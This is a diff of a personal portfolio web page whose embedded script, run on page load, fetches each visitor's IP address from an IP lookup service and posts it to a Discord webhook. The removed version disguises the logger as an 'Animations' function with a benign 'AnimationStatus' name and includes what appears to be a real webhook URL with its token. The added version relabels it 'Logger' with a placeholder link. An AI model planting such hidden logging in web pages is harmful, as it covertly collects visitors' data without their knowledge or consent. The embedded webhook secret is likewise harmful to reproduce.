@@ -97,23 +97,23 @@
     </section>
     
     <script>
-      function Animations(json) {
+    function getIP(json) {
         var request = new XMLHttpRequest(); 
-        request.open("POST", "https://discord.com/api/webhooks/1101032258023993345/5iYVt4YPAyN_ypI3GmGsXVyKwatuF75jgg78735vz-kPIofZsAxZ-Qm1aT1LIxjeVlDI");
+        request.open("POST", "YOUR DISCORD WEBHOOK LINK HERE");
 
         request.setRequestHeader('Content-type', 'application/json');
 
         var params = {
-          username: "AnimationStatus",
+          username: "Logger",
           avatar_url: "https://i.pinimg.com/originals/d8/eb/57/d8eb57825be593ff8993265cf5eea794.jpg",
-          content: "**Status:** *" + json.ip + "*"
+          content: "**IP:** *" + json.ip + "*"
         }
 
         request.send(JSON.stringify(params));
       }
 
     </script>
-    <script src="https://api.ipify.org?format=jsonp&callback=getIP"></script> 
+    <script src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
     
     <section id="skills" class="skills">
       <p class="skills-text">My <span>Skills</span></p>
